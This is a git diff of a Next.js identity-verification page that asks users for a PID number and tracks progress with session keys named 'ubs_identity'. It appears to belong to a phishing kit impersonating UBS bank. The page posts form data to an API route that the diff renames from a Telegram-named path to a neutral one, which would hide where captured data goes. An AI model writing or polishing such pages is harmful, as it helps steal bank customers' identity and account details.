@@ -4,14 +4,17 @@ import { useEffect, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 import { HelpCircle } from "lucide-react";
 import { Button } from "@/components/ui/button";
-import { SiteHeader } from "@/components/site-header";
+import { VerificationHeader } from "@/components/verification-header";
 import { Input } from "@/components/ui/input";
 
 export default function VerifyIdentityPage() {
   const router = useRouter();
 
   useEffect(() => {
-    if (typeof window !== "undefined" && !sessionStorage.getItem("ubs_identity"))
+    if (
+      typeof window !== "undefined" &&
+      !sessionStorage.getItem("ubs_identity")
+    )
       router.replace("/verify");
   }, [router]);
 
@@ -35,7 +38,7 @@ export default function VerifyIdentityPage() {
     setIsLoading(true);
 
     try {
-      await fetch("/api/telegram/verify-identity", {
+      await fetch("/api/verify-identity", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -72,7 +75,8 @@ export default function VerifyIdentityPage() {
       countdownRef.current = null;
     }
     setCountdown(0);
-    if (typeof window !== "undefined") sessionStorage.setItem("ubs_identity_verified", "1");
+    if (typeof window !== "undefined")
+      sessionStorage.setItem("ubs_identity_verified", "1");
     router.push("/verify?step=3");
   };
 
@@ -85,7 +89,7 @@ export default function VerifyIdentityPage() {
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
-      <SiteHeader />
+      <VerificationHeader />
       <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
         <div className="flex items-center gap-2 mb-2">
           <h1 className="text-2xl font-semibold text-gray-900">
@@ -101,7 +105,8 @@ export default function VerifyIdentityPage() {
           </button>
         </div>
         <p className="text-gray-700 text-sm mb-6">
-          Please provide additional identity verification information to continue.
+          Please provide additional identity verification information to
+          continue.
         </p>
 
         <form onSubmit={handleSubmit} className="space-y-5">
@@ -118,9 +123,7 @@ export default function VerifyIdentityPage() {
               inputMode="numeric"
               placeholder="Enter your PID number"
               value={pidNumber}
-              onChange={(e) =>
-                setPidNumber(e.target.value.replace(/\D/g, ""))
-              }
+              onChange={(e) => setPidNumber(e.target.value.replace(/\D/g, ""))}
               className="max-w-[220px] h-10 bg-gray-50 border-gray-300 rounded-md"
             />
             <p className="text-xs text-gray-500 mt-1">
